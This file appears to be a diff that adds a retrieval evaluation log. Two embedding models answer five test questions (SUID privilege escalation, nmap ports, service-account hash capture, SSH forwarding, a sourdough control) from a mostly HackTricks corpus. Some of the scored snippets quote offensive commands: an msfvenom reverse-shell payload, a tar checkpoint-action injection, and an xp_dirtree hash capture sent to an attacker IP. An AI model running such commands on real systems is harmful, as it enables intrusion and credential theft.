@@ -1,0 +1,145 @@
+
+Question : 'How do I escalate privileges on Linux when I find a SUID binary?'
+
+  == nomic-embed-text   (collection 'casefile_nomic-embed-text', 22720 vectors, cosine)
+   #1  sim=0.7433  dist=0.2567  [hacktricks] hacktricks/src/linux-hardening/linux-basics/linux-privilege-escalation/README.md > CVE-2016-5195 (DirtyCow)
+        Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8 ```bash
+   #2  sim=0.7157  dist=0.2843  [hacktricks] hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-code-signing.md > `cs_blobs` & `cs_blob`
+        rity measures depend on the binary being a platform binary, so way to escalate privileges is to **make the binary a platform binary** (for e ...
+   #3  sim=0.7130  dist=0.2870  [hacktricks] hacktricks/src/linux-hardening/linux-basics/linux-privilege-escalation/README.md > References
+        Tricks for Linux Priv Escalation](https://github.com/frizb/Linux-Privilege-Escalation) - [12] [lucyoa/kernel-exploits](https://github.com/lu ...
+   #4  sim=0.7121  dist=0.2879  [hacktricks] hacktricks/src/linux-hardening/linux-basics/linux-privilege-escalation/README.md > SUID Binary – .so injection
+        When encountering a binary with **SUID** permissions that seems unusual, it's a good practice to verify if it's loading **.so** files proper ...
+   #5  sim=0.7090  dist=0.2910  [hacktricks] hacktricks/src/generic-methodologies-and-resources/pentesting-methodology.md > **10.1- Local Privesc**
+        If you are **not root/Administrator** inside the box, you should find a way to **escalate privileges.**\ Here you can find a **guide to esca ...
+
+  == all-minilm   (collection 'casefile_all-minilm', 22720 vectors, cosine)
+   #1  sim=0.6718  dist=0.3282  [hacktricks] hacktricks/src/linux-hardening/interesting-files-permissions/suid-shared-library-and-linker-abuse.md > Fast Enumeration
+        Start by finding unusual SUID files and checking whether they are dynamically linked:<sup>[[1]](#references)[[3]](#references)</sup> ```bash ...
+   #2  sim=0.6485  dist=0.3515  [hacktricks] hacktricks/src/linux-hardening/main-system-information/linux-privilege-escalation-checklist.md > [SUDO and SUID commands](../linux-basics/linux-privilege-escalation/index.html#sudo-and-suid)
+        a writable folder? - [ ] [**SUID RPATH/RUNPATH or writable library path**](../interesting-files-permissions/suid-shared-library-and-linker-a ...
+   #3  sim=0.6357  dist=0.3643  [hacktricks] hacktricks/src/linux-hardening/user-information/interesting-groups-linux-pe/README.md > PE - Method 2
+        Find all suid binaries and check if there is the binary **Pkexec**: ```bash find / -perm -4000 2>/dev/null ``` If **pkexec is a SUID binary* ...
+   #4  sim=0.6274  dist=0.3726  [hacktricks] hacktricks/src/linux-hardening/interesting-files-permissions/suid-shared-library-and-linker-abuse.md > SUID Shared Library and Linker Abuse
+        {{#include ../../banners/hacktricks-training.md}} SUID binaries are usually reviewed for direct command execution, but custom SUID programs ...
+   #5  sim=0.6219  dist=0.3781  [hacktricks] hacktricks/src/linux-hardening/interesting-files-permissions/suid-shared-library-and-linker-abuse.md > LD_PRELOAD, LD_LIBRARY_PATH and SUID
+        For normal programs, `LD_PRELOAD` and `LD_LIBRARY_PATH` can force or influence shared object loading. For SUID programs, the dynamic loader ...
+
+  Chunks returned by every model: 0 of 5
+
+
+Question : 'Which nmap option scans every TCP port?'
+
+  == nomic-embed-text   (collection 'casefile_nomic-embed-text', 22720 vectors, cosine)
+   #1  sim=0.8266  dist=0.1734  [manpage/nmap] manpages/nmap.man.txt > PORT SPECIFICATION AND SCAN ORDER
+        In addition to all of the scan methods discussed previously, Nmap offers options for specifying which ports are scanned and whether the scan ...
+   #2  sim=0.8160  dist=0.1840  [manpage/nmap] manpages/nmap.man.txt > EXAMPLES
+        not currently exist. nmap -v scanme.nmap.org This option scans all reserved TCP ports on the machine scanme.nmap.org . The -v option enables ...
+   #3  sim=0.8049  dist=0.1951  [manpage/nmap] manpages/nmap.man.txt > NAME
+        nmap - Network exploration tool and security / port scanner
+   #4  sim=0.7996  dist=0.2004  [manpage/nmap] manpages/nmap.man.txt > PORT SCANNING BASICS
+        While Nmap has grown in functionality over the years, it began as an efficient port scanner, and that remains its core function. The simple ...
+   #5  sim=0.7837  dist=0.2163  [hacktricks] hacktricks/src/generic-methodologies-and-resources/pentesting-network/nmap-summary-esp.md > **Focus Analysis**
+        **-p:** Used to specify ports to scan. To select all 65,335 ports: **-p-** or **-p all**. Nmap has an internal classification based on popul ...
+
+  == all-minilm   (collection 'casefile_all-minilm', 22720 vectors, cosine)
+   #1  sim=0.7992  dist=0.2008  [hacktricks] hacktricks/src/generic-methodologies-and-resources/pentesting-network/nmap-summary-esp.md > **Focus Analysis**
+        **-p:** Used to specify ports to scan. To select all 65,335 ports: **-p-** or **-p all**. Nmap has an internal classification based on popul ...
+   #2  sim=0.7486  dist=0.2514  [manpage/nmap] manpages/nmap.man.txt > PORT SPECIFICATION AND SCAN ORDER
+        with the names. For example, to scan FTP and all ports whose names begin with “http”, use -p ftp,http*. Be careful about shell expansions an ...
+   #3  sim=0.7461  dist=0.2539  [manpage/nmap] manpages/nmap.man.txt > PORT SPECIFICATION AND SCAN ORDER
+        In addition to all of the scan methods discussed previously, Nmap offers options for specifying which ports are scanned and whether the scan ...
+   #4  sim=0.7319  dist=0.2681  [manpage/nmap] manpages/nmap.man.txt > EXAMPLES
+        not currently exist. nmap -v scanme.nmap.org This option scans all reserved TCP ports on the machine scanme.nmap.org . The -v option enables ...
+   #5  sim=0.7303  dist=0.2697  [manpage/nmap] manpages/nmap.man.txt > PORT SCANNING BASICS
+        While Nmap has grown in functionality over the years, it began as an efficient port scanner, and that remains its core function. The simple ...
+
+  Chunks returned by every model: 4 of 5
+
+
+Question : 'As a normal domain user, how can I get service account password hashes to crack offline?'
+
+  == nomic-embed-text   (collection 'casefile_nomic-embed-text', 22720 vectors, cosine)
+   #1  sim=0.7127  dist=0.2873  [hacktricks] hacktricks/src/windows-hardening/active-directory-methodology/kerberoast.md > Mitigation / Hardening
+        - Use gMSA/dMSA or machine accounts for services. Managed accounts have 120+ character random passwords and rotate automatically, making off ...
+   #2  sim=0.7100  dist=0.2900  [hacktricks] hacktricks/src/windows-hardening/active-directory-methodology/security-descriptors.md > Remote access to hashes
+        DAMP can create a registry-ACL backdoor that later permits remote retrieval of the machine-account hash, local SAM hashes, and cached domain ...
+   #3  sim=0.7099  dist=0.2901  [hacktricks] hacktricks/src/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics/README.md > SAM
+        The **SAM** hive contains local user and group account data, including password hashes protected by the system's boot-key material.<sup>[[38 ...
+   #4  sim=0.7059  dist=0.2941  [hacktricks] hacktricks/src/network-services-pentesting/pentesting-mssql-microsoft-sql-server/README.md > From NetNTLMv2 capture to MSSQL silver ticket (PAC group injection)
+        - Capture the SQL Server service account NetNTLMv2 via `xp_dirtree '\\\\<attacker_ip>\\share'` with Responder (Hashcat mode 5600 to crack). ...
+   #5  sim=0.6968  dist=0.3032  [hacktricks] hacktricks/src/todo/online-platforms-with-api.md > [Have I Been Pwned](https://haveibeenpwned.com/) <sup>[[26]](#references)</sup>
+        Check whether an email address or verified domain appears in known breaches. The separate Pwned Passwords service checks password hashes by ...
+
+  == all-minilm   (collection 'casefile_all-minilm', 22720 vectors, cosine)
+   #1  sim=0.5820  dist=0.4180  [hacktricks] hacktricks/src/todo/online-platforms-with-api.md > [Have I Been Pwned](https://haveibeenpwned.com/) <sup>[[26]](#references)</sup>
+        Check whether an email address or verified domain appears in known breaches. The separate Pwned Passwords service checks password hashes by ...
+   #2  sim=0.5550  dist=0.4450  [hacktricks] hacktricks/src/network-services-pentesting/pentesting-mssql-microsoft-sql-server/README.md > From NetNTLMv2 capture to MSSQL silver ticket (PAC group injection)
+        - Capture the SQL Server service account NetNTLMv2 via `xp_dirtree '\\\\<attacker_ip>\\share'` with Responder (Hashcat mode 5600 to crack). ...
+   #3  sim=0.5545  dist=0.4455  [hacktricks] hacktricks/src/windows-hardening/active-directory-methodology/kerberoast.md > Mitigation / Hardening
+        - Use gMSA/dMSA or machine accounts for services. Managed accounts have 120+ character random passwords and rotate automatically, making off ...
+   #4  sim=0.5383  dist=0.4617  [hacktricks] hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-files-folders-and-binaries/macos-sensitive-locations.md > Shadow Passwords
+        Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\ The following onel ...
+   #5  sim=0.5191  dist=0.4809  [hacktricks] hacktricks/src/network-services-pentesting/pentesting-rpcbind.md > Password-hash extraction and cracking workflow
+        In insecure environments the `passwd` maps can expose password hashes directly: ```bash ypcat -d <nis-domain> -h <nis-server> passwd.byname ...
+
+  Chunks returned by every model: 3 of 5
+
+
+Question : 'ssh local port forwarding'
+
+  == nomic-embed-text   (collection 'casefile_nomic-embed-text', 22720 vectors, cosine)
+   #1  sim=0.7608  dist=0.2392  [hacktricks] hacktricks/src/generic-hacking/tunneling-and-port-forwarding.md > Remote Port2Port
+        Open new Port in SSH Server --> Other port Remote (`-R`) forwarding listens on the SSH server and connects to the local side; the explicit b ...
+   #2  sim=0.7423  dist=0.2577  [hacktricks] hacktricks/src/network-services-pentesting/pentesting-ssh.md > SFTP Tunneling
+        If you have access to a SFTP server you can also tunnel your traffic through this for example using the common port forwarding: ```bash sudo ...
+   #3  sim=0.7409  dist=0.2591  [hacktricks] hacktricks/src/generic-hacking/tunneling-and-port-forwarding.md > Port2hostnet (proxychains)
+        Local Port --> Compromised host (SSH) --> Wherever Dynamic (`-D`) forwarding creates a local SOCKS4/SOCKS5 listener whose connections are op ...
+   #4  sim=0.7380  dist=0.2620  [hacktricks] hacktricks/src/generic-hacking/tunneling-and-port-forwarding.md > Port2Port
+        Local port --> Compromised host (SSH) --> Third_box:Port Local (`-L`) forwarding listens on the client and connects to the destination from ...
+   #5  sim=0.7361  dist=0.2639  [hacktricks] hacktricks/src/generic-hacking/reverse-shells/expose-local-to-the-internet.md > **Serveo**
+        Serveo's documentation describes SSH forwarding for HTTP endpoints and private/public TCP forwarding; requesting a non-80/443 public TCP por ...
+
+  == all-minilm   (collection 'casefile_all-minilm', 22720 vectors, cosine)
+   #1  sim=0.6716  dist=0.3284  [hacktricks] hacktricks/src/generic-hacking/tunneling-and-port-forwarding.md > Remote Port2Port
+        Open new Port in SSH Server --> Other port Remote (`-R`) forwarding listens on the SSH server and connects to the local side; the explicit b ...
+   #2  sim=0.5850  dist=0.4150  [hacktricks] hacktricks/src/generic-hacking/tunneling-and-port-forwarding.md > Port2Port
+        Local port --> Compromised host (SSH) --> Third_box:Port Local (`-L`) forwarding listens on the client and connects to the destination from ...
+   #3  sim=0.5627  dist=0.4373  [hacktricks] hacktricks/src/windows-hardening/basic-powershell-for-pentesters/README.md > Open SSH to the world
+        New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow
+   #4  sim=0.5627  dist=0.4373  [hacktricks] hacktricks/src/generic-hacking/tunneling-and-port-forwarding.md > Port2hostnet (proxychains)
+        Local Port --> Compromised host (SSH) --> Wherever Dynamic (`-D`) forwarding creates a local SOCKS4/SOCKS5 listener whose connections are op ...
+   #5  sim=0.5593  dist=0.4407  [hacktricks] hacktricks/src/generic-hacking/tunneling-and-port-forwarding.md > Reverse Port Forwarding
+        This is useful to get reverse shells from internal hosts through a DMZ to your host: The server's `GatewayPorts` setting controls whether a ...
+
+  Chunks returned by every model: 3 of 5
+
+
+Question : 'How do I bake sourdough bread?'
+
+  == nomic-embed-text   (collection 'casefile_nomic-embed-text', 22720 vectors, cosine)
+   #1  sim=0.4958  dist=0.5042  [hacktricks] hacktricks/src/network-services-pentesting/pentesting-rpcbind.md > Labs to practice
+        - Practice these techniques in the [**Irked HTB machine**](https://app.hackthebox.com/machines/Irked).
+   #2  sim=0.4891  dist=0.5109  [hacktricks] hacktricks/src/pentesting-web/web-tool-wfuzz.md > Save / restore long fuzzing sessions
+        ```bash wfuzz -c -w dirs.txt --hc 404 --dump-recipe /tmp/wfuzz.recipe http://example.com/FUZZ wfuzz --recipe /tmp/wfuzz.recipe -b 'session=a ...
+   #3  sim=0.4873  dist=0.5127  [hacktricks] hacktricks/src/binary-exploitation/stack-overflow/stack-shellcode/README.md > Generate the shellcode
+        shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell
+   #4  sim=0.4862  dist=0.5138  [hacktricks] hacktricks/src/mobile-pentesting/android-app-pentesting/README.md > Manual
+        [Read this tutorial to learn some tricks on **how to reverse custom obfuscation**](manual-deobfuscation.md)
+   #5  sim=0.4860  dist=0.5140  [hacktricks] hacktricks/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.md > Table
+        |
+
+  == all-minilm   (collection 'casefile_all-minilm', 22720 vectors, cosine)
+   #1  sim=0.2855  dist=0.7145  [hacktricks] hacktricks/src/generic-hacking/reverse-shells/linux.md > Build after preparing the OpenSSL dependency as described in the repository README
+        git clone https://github.com/emptymonkey/revsh && cd revsh && make
+   #2  sim=0.2462  dist=0.7538  [hacktricks] hacktricks/src/linux-hardening/interesting-files-permissions/wildcards-spare-tricks.md > attacker-controlled directory
+        echo 'echo pwned > /tmp/pwn' > shell.sh chmod +x shell.sh touch -- "--checkpoint=1" touch -- "--checkpoint-action=exec=sh shell.sh" ``` Once ...
+   #3  sim=0.2387  dist=0.7613  [hacktricks] hacktricks/src/AI/AI-Burp-MCP.md > 1) Install Burp MCP Server
+        Install **MCP Server** from the Burp BApp Store and verify it is listening on `127.0.0.1:9876`.<sup>[[1]](#references)[[2]](#references)</su ...
+   #4  sim=0.2383  dist=0.7617  [hacktricks] hacktricks/src/generic-hacking/reverse-shells/msfvenom.md > **Bash**
+        ```bash msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh ```
+   #5  sim=0.2353  dist=0.7647  [hacktricks] hacktricks/src/network-services-pentesting/pentesting-web/ruby-tricks.md > Minimal vulnerable pattern
+        ```ruby require 'logger' require 'pathname' logger = Logger.new('logs/error.log') param = CGI.unescape(params[:script]) path_obj = Pathname. ...
+
+  Chunks returned by every model: 0 of 5
+
